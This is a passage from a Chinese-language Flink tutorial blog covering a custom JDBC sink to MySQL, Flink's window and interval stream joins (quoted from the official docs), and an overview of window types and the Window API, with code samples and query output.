class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci;</span><br></pre></td></tr></table></figure></li><li><p> 新建schema  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `sensor_temp` (</span><br><span class="line">  `id` <span class="type">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `temp` <span class="keyword">double</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure></li><li><p> 编写java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.sink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> apitest.source.SourceTest4_UDF;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.sink.RichSinkFunction;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/1 2:48 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkTest4_Jdbc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建执行环境</span></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置并行度 = 1</span></span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从文件读取数据</span></span><br><span class="line"><span class="comment">//        DataStream&lt;String&gt; inputStream = env.readTextFile(&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        // 转换成SensorReading类型</span></span><br><span class="line"><span class="comment">//        DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span></span><br><span class="line"><span class="comment">//            String[] fields = line.split(&quot;,&quot;);</span></span><br><span class="line"><span class="comment">//            return new SensorReading(fields[0], new Long(fields[1]), new Double(fields[2]));</span></span><br><span class="line"><span class="comment">//        &#125;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用之前编写的随机变动温度的SourceFunction来生成数据</span></span><br><span class="line">        DataStream&lt;SensorReading&gt; dataStream = env.addSource(<span class="keyword">new</span> SourceTest4_UDF.MySensorSource());</span><br><span class="line"></span><br><span class="line">        dataStream.addSink(<span class="keyword">new</span> MyJdbcSink());</span><br><span class="line"></span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现自定义的SinkFunction</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MyJdbcSink</span> <span class="keyword">extends</span> <span class="title">RichSinkFunction</span>&lt;<span class="title">SensorReading</span>&gt; </span>&#123;</span><br><span class="line">        <span class="comment">// 声明连接和预编译语句</span></span><br><span class="line">        Connection connection = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement insertStmt = <span class="keyword">null</span>;</span><br><span class="line">        PreparedStatement updateStmt = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            connection = DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/flink_test?useUnicode=true&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=UTF-8&amp;useSSL=false&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;example&quot;</span>);</span><br><span class="line">            insertStmt = connection.prepareStatement(<span class="string">&quot;insert into sensor_temp (id, temp) values (?, ?)&quot;</span>);</span><br><span class="line">            updateStmt = connection.prepareStatement(<span class="string">&quot;update sensor_temp set temp = ? where id = ?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 每来一条数据，调用连接，执行sql</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(SensorReading value, Context context)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// 直接执行更新语句，如果没有更新那么就插入</span></span><br><span class="line">            updateStmt.setDouble(<span class="number">1</span>, value.getTemperature());</span><br><span class="line">            updateStmt.setString(<span class="number">2</span>, value.getId());</span><br><span class="line">            updateStmt.execute();</span><br><span class="line">            <span class="keyword">if</span> (updateStmt.getUpdateCount() == <span class="number">0</span>) &#123;</span><br><span class="line">                insertStmt.setString(<span class="number">1</span>, value.getId());</span><br><span class="line">                insertStmt.setDouble(<span class="number">2</span>, value.getTemperature());</span><br><span class="line">                insertStmt.execute();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            insertStmt.close();</span><br><span class="line">            updateStmt.close();</span><br><span class="line">            connection.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 运行Flink程序，查看MySQL数据（可以看到MySQL里的数据一直在变动）  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM sensor_temp;</span></span><br><span class="line">+-----------+--------------------+</span><br><span class="line">| id        | temp               |</span><br><span class="line">+-----------+--------------------+</span><br><span class="line">| sensor_3  | 20.489172407885917 |</span><br><span class="line">| sensor_10 |  73.01289164711463 |</span><br><span class="line">| sensor_4  | 43.402500895809744 |</span><br><span class="line">| sensor_1  |  6.894772325662007 |</span><br><span class="line">| sensor_2  | 101.79309911751122 |</span><br><span class="line">| sensor_7  | 63.070612021580324 |</span><br><span class="line">| sensor_8  |  63.82606628090501 |</span><br><span class="line">| sensor_5  |  57.67115738487047 |</span><br><span class="line">| sensor_6  |  50.84442627975055 |</span><br><span class="line">| sensor_9  |  52.58400793021675 |</span><br><span class="line">+-----------+--------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT * FROM sensor_temp;</span></span><br><span class="line">+-----------+--------------------+</span><br><span class="line">| id        | temp               |</span><br><span class="line">+-----------+--------------------+</span><br><span class="line">| sensor_3  | 19.498209543035923 |</span><br><span class="line">| sensor_10 |  71.92981963197121 |</span><br><span class="line">| sensor_4  | 43.566017489470426 |</span><br><span class="line">| sensor_1  |  6.378208186786803 |</span><br><span class="line">| sensor_2  | 101.71010087830145 |</span><br><span class="line">| sensor_7  |  62.11402602179431 |</span><br><span class="line">| sensor_8  |  64.33196455020062 |</span><br><span class="line">| sensor_5  |  56.39071692662006 |</span><br><span class="line">| sensor_6  | 48.952784757264894 |</span><br><span class="line">| sensor_9  | 52.078086096436685 |</span><br><span class="line">+-----------+--------------------+</span><br><span class="line">10 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li></ol><h4 id="Joining"><a href="#Joining" class="headerlink" title="Joining"></a>Joining</h4><blockquote><p><a href="https://ci.apache.org/projects/flink/flink-docs-release-1.12/zh/dev/stream/operators/joining.html">Joining</a></p></blockquote><h5 id="Window-Join"><a href="#Window-Join" class="headerlink" title="Window Join"></a>Window Join</h5><pre><code>A window join joins the elements of two streams that share a common key and lie in the same window. These windows can be defined by using a [window assigner](https://ci.apache.org/projects/flink/flink-docs-release-1.12/zh/dev/stream/operators/windows.html###window-assigners) and are evaluated on elements from both of the streams.The elements from both sides are then passed to a user-defined `JoinFunction` or `FlatJoinFunction`     where the user can emit results that meet the join criteria.The general usage can be summarized as follows:</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">stream.join(otherStream)</span><br><span class="line">    .where(&lt;KeySelector&gt;)</span><br><span class="line">    .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">    .window(&lt;WindowAssigner&gt;)</span><br><span class="line">    .apply(&lt;JoinFunction&gt;)</span><br></pre></td></tr></table></figure><h6 id="Tumbling-Window-Join"><a href="#Tumbling-Window-Join" class="headerlink" title="Tumbling Window Join"></a>Tumbling Window Join</h6><pre><code>When performing a tumbling window join, all elements with a common key and a common tumbling window are joined as pairwise combinations and passed on to a `JoinFunction` or `FlatJoinFunction`. Because this behaves like an inner join, elements of one stream that do not have elements from another stream in their tumbling window are not emitted!</code></pre><p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.12/fig/tumbling-window-join.svg###id=bGy5W&originHeight=350&originWidth=1000&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>As illustrated in the figure, we define a tumbling window with the size of 2 milliseconds, which results in windows of the form `[0,1], [2,3], ...`. The image shows the pairwise combinations of all elements in each window which will be passed on to the `JoinFunction`. Note that in the tumbling window `[6,7]` nothing is emitted because no elements exist in the green stream to be joined with the orange elements ⑥ and ⑦.</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.TumblingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; orangeStream = ...</span><br><span class="line">DataStream&lt;Integer&gt; greenStream = ...</span><br><span class="line"></span><br><span class="line">orangeStream.join(greenStream)</span><br><span class="line">    .where(&lt;KeySelector&gt;)</span><br><span class="line">    .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">    .window(TumblingEventTimeWindows.of(Time.milliseconds(<span class="number">2</span>)))</span><br><span class="line">    .apply (<span class="keyword">new</span> JoinFunction&lt;Integer, Integer, String&gt; ()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(Integer first, Integer second)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> first + <span class="string">&quot;,&quot;</span> + second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h6 id="Sliding-Window-Join"><a href="#Sliding-Window-Join" class="headerlink" title="Sliding Window Join"></a>Sliding Window Join</h6><pre><code>When performing a sliding window join, all elements with a common key and common sliding window are joined as pairwise combinations and passed on to the `JoinFunction` or `FlatJoinFunction`. Elements of one stream that do not have elements from the other stream in the current sliding window are not emitted! Note that some elements might be joined in one sliding window but not in another!</code></pre><p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.12/fig/sliding-window-join.svg###id=a8Dwf&originHeight=350&originWidth=1000&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>In this example we are using sliding windows with a size of two milliseconds and slide them by one millisecond, resulting in the sliding windows `[-1, 0],[0,1],[1,2],[2,3], …`. The joined elements below the x-axis are the ones that are passed to the `JoinFunction` for each sliding window. Here you can also see how for example the orange ② is joined with the green ③ in the window `[2,3]`, but is not joined with anything in the window `[1,2]`.</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; orangeStream = ...</span><br><span class="line">DataStream&lt;Integer&gt; greenStream = ...</span><br><span class="line"></span><br><span class="line">orangeStream.join(greenStream)</span><br><span class="line">    .where(&lt;KeySelector&gt;)</span><br><span class="line">    .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">    .window(SlidingEventTimeWindows.of(Time.milliseconds(<span class="number">2</span>) <span class="comment">/* size */</span>, Time.milliseconds(<span class="number">1</span>) <span class="comment">/* slide */</span>))</span><br><span class="line">    .apply (<span class="keyword">new</span> JoinFunction&lt;Integer, Integer, String&gt; ()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(Integer first, Integer second)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> first + <span class="string">&quot;,&quot;</span> + second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h6 id="Session-Window-Join"><a href="#Session-Window-Join" class="headerlink" title="Session Window Join"></a>Session Window Join</h6><pre><code>When performing a session window join, all elements with the same key that when _“combined”_ fulfill the session criteria are joined in pairwise combinations and passed on to the `JoinFunction` or `FlatJoinFunction`. Again this performs an inner join, so if there is a session window that only contains elements from one stream, no output will be emitted!</code></pre><p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.12/fig/session-window-join.svg###id=RyB4t&originHeight=350&originWidth=1000&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>Here we define a session window join where each session is divided by a gap of at least 1ms. There are three sessions, and in the first two sessions the joined elements from both streams are passed to the `JoinFunction`. In the third session there are no elements in the green stream, so ⑧ and ⑨ are not joined!</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.EventTimeSessionWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"> </span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; orangeStream = ...</span><br><span class="line">DataStream&lt;Integer&gt; greenStream = ...</span><br><span class="line"></span><br><span class="line">orangeStream.join(greenStream)</span><br><span class="line">    .where(&lt;KeySelector&gt;)</span><br><span class="line">    .equalTo(&lt;KeySelector&gt;)</span><br><span class="line">    .window(EventTimeSessionWindows.withGap(Time.milliseconds(<span class="number">1</span>)))</span><br><span class="line">    .apply (<span class="keyword">new</span> JoinFunction&lt;Integer, Integer, String&gt; ()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">join</span><span class="params">(Integer first, Integer second)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> first + <span class="string">&quot;,&quot;</span> + second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h5 id="Interval-Join"><a href="#Interval-Join" class="headerlink" title="Interval Join"></a>Interval Join</h5><p>The interval join joins elements of two streams (we’ll call them A &amp; B for now) with a common key and where elements of stream B have timestamps that lie in a relative time interval to timestamps of elements in stream A.</p><p>This can also be expressed more formally as <code>b.timestamp ∈ [a.timestamp + lowerBound; a.timestamp + upperBound]</code> or <code>a.timestamp + lowerBound &lt;= b.timestamp &lt;= a.timestamp + upperBound</code></p><p>where a and b are elements of A and B that share a common key. Both the lower and upper bound can be either negative or positive as long as as the lower bound is always smaller or equal to the upper bound. The interval join currently only performs inner joins.</p><p>When a pair of elements are passed to the <code>ProcessJoinFunction</code>, they will be assigned with the larger timestamp (which can be accessed via the <code>ProcessJoinFunction.Context</code>) of the two elements.</p><p><strong>Note</strong> The interval join currently only supports event time.</p><p><img src="https://ci.apache.org/projects/flink/flink-docs-release-1.12/fig/interval-join.svg###id=RcqYV&originHeight=350&originWidth=1000&originalType=binary&ratio=1&status=done&style=none"></p><p>In the example above, we join two streams ‘orange’ and ‘green’ with a lower bound of -2 milliseconds and an upper bound of +1 millisecond. Be default, these boundaries are inclusive, but <code>.lowerBoundExclusive()</code> and <code>.upperBoundExclusive</code> can be applied to change the behaviour.</p><p>Using the more formal notation again this will translate to</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orangeElem.ts + lowerBound &lt;= greenElem.ts &lt;= orangeElem.ts + upperBound</span><br></pre></td></tr></table></figure><p>as indicated by the triangles.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.functions.KeySelector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.co.ProcessJoinFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">DataStream&lt;Integer&gt; orangeStream = ...</span><br><span class="line">DataStream&lt;Integer&gt; greenStream = ...</span><br><span class="line"></span><br><span class="line">orangeStream</span><br><span class="line">    .keyBy(&lt;KeySelector&gt;)</span><br><span class="line">    .intervalJoin(greenStream.keyBy(&lt;KeySelector&gt;))</span><br><span class="line">    .between(Time.milliseconds(-<span class="number">2</span>), Time.milliseconds(<span class="number">1</span>))</span><br><span class="line">    .process (<span class="keyword">new</span> ProcessJoinFunction&lt;Integer, Integer, String()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(Integer left, Integer right, Context ctx, Collector&lt;String&gt; out)</span> </span>&#123;</span><br><span class="line">            out.collect(first + <span class="string">&quot;,&quot;</span> + second);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h3 id="Flink的Window"><a href="#Flink的Window" class="headerlink" title="Flink的Window"></a>Flink的Window</h3><h4 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h4><blockquote><p><a href="https://blog.csdn.net/dongkang123456/article/details/108374799">Flink_Window</a></p></blockquote><h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p><img src="https://img-blog.csdnimg.cn/20200903082944202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=Rzfw8&originHeight=228&originWidth=912&originalType=binary&ratio=1&status=done&style=none"></p><pre><code>streaming流式计算是一种被设计用于处理无限数据集的数据处理引擎，而无限数据集是指一种不断增长的本质上无限的数据集，而**window是一种切割无限数据为有限块进行处理的手段**。**Window是无限数据流处理的核心，Window将一个无限的stream拆分成有限大小的”buckets”桶，我们可以在这些桶上做计算操作**。</code></pre><p><em>举例子：假设按照时间段划分桶，接收到的数据马上能判断放到哪个桶，且多个桶的数据能并行被处理。（迟到的数据也可判断是原本属于哪个桶的）</em></p><h5 id="Window类型"><a href="#Window类型" class="headerlink" title="Window类型"></a>Window类型</h5><ul><li>时间窗口（Time Window） <ul><li>滚动时间窗口</li><li>滑动时间窗口</li><li>会话窗口</li></ul></li><li>计数窗口（Count Window） <ul><li>滚动计数窗口</li><li>滑动计数窗口</li></ul></li></ul><p><strong>TimeWindow：按照时间生成Window</strong></p><p><strong>CountWindow：按照指定的数据条数生成一个Window，与时间无关</strong></p><hr><h6 id="滚动窗口-Tumbling-Windows"><a href="#滚动窗口-Tumbling-Windows" class="headerlink" title="滚动窗口(Tumbling Windows)"></a>滚动窗口(Tumbling Windows)</h6><p><img src="https://img-blog.csdnimg.cn/20200903083725483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=RF2Bi&originHeight=421&originWidth=822&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 依据<strong>固定的窗口长度</strong>对数据进行切分 </li><li> 时间对齐，窗口长度固定，没有重叠 </li></ul><h6 id="滑动窗口-Sliding-Windows"><a href="#滑动窗口-Sliding-Windows" class="headerlink" title="滑动窗口(Sliding Windows)"></a>滑动窗口(Sliding Windows)</h6><p><img src="https://img-blog.csdnimg.cn/20200903084127244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=Reyy3&originHeight=379&originWidth=817&originalType=binary&ratio=1&status=done&style=none"></p><ul><li> 可以按照固定的长度向后滑动固定的距离 </li><li> 滑动窗口由<strong>固定的窗口长度</strong>和<strong>滑动间隔</strong>组成 </li><li> 可以有重叠(是否重叠和滑动距离有关系) </li><li> 滑动窗口是固定窗口的更广义的一种形式，滚动窗口可以看做是滑动窗口的一种特殊情况（即窗口大小和滑动间隔相等） </li></ul><h6 id="会话窗口-Session-Windows"><a href="#会话窗口-Session-Windows" class="headerlink" title="会话窗口(Session Windows)"></a>会话窗口(Session Windows)</h6><p><img src="https://img-blog.csdnimg.cn/20200903085034747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RvbmdrYW5nMTIzNDU2,size_16,color_FFFFFF,t_70###pic_center###id=grS2X&originHeight=356&originWidth=782&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>由一系列事件组合一个指定时间长度的timeout间隙组成，也就是一段时间没有接收到新数据就会生成新的窗口</li><li>特点：时间无对齐</li></ul><h4 id="Window-API"><a href="#Window-API" class="headerlink" title="Window API"></a>Window API</h4><h5 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h5><ul><li> 窗口分配器——<code>window()</code>方法 </li><li> 我们可以用<code>.window()</code>来定义一个窗口，然后基于这个window去做一些聚合或者其他处理操作。</li></ul><p><strong>注意</strong><code>**window()**</code><strong>方法必须在keyBy之后才能使用</strong>。 </p><ul><li> Flink提供了更加简单的<code>.timeWindow()</code>和<code>.countWindow()</code>方法，用于定义时间窗口和计数窗口。 </li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DataStream&lt;Tuple2&lt;String,Double&gt;&gt; minTempPerWindowStream = </span><br><span class="line">  datastream</span><br><span class="line">  .map(<span class="keyword">new</span> MyMapper())</span><br><span class="line">  .keyBy(data -&gt; data.f0)</span><br><span class="line">  .timeWindow(Time.seconds(<span class="number">15</span>))</span><br><span class="line">  .minBy(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h6 id="窗口分配器-window-assigner"><a href="#窗口分配器-window-assigner" class="headerlink" title="窗口分配器(window assigner)"></a>窗口分配器(window assigner)</h6><ul><li><code>window()</code>方法接收的输入参数是一个WindowAssigner</li><li>WindowAssigner负责将每条输入的数据分发到正确的window中</li><li>Flink提供了通用的WindowAssigner <ul><li>滚动窗口（tumbling window）</li><li>滑动窗口（sliding window）</li><li>会话窗口（session window）</li><li><strong>全局窗口（global window）</strong></li></ul></li></ul><h6 id="创建不同类型的窗口"><a href="#创建不同类型的窗口" class="headerlink" title="创建不同类型的窗口"></a>创建不同类型的窗口</h6><ul><li> 滚动时间窗口（tumbling time window）<br><code>.timeWindow(Time.seconds(15))</code> </li><li> 滑动时间窗口（sliding time window）<br><code>.timeWindow(Time.seconds(15),Time.seconds(5))</code> </li><li> 会话窗口（session window）<br><code>.window(EventTimeSessionWindows.withGap(Time.minutes(10)))</code> </li><li> 滚动计数窗口（tumbling count window）<br><code>.countWindow(5)</code> </li><li> 滑动计数窗口（sliding count window）<br><code>.countWindow(10,2)</code> 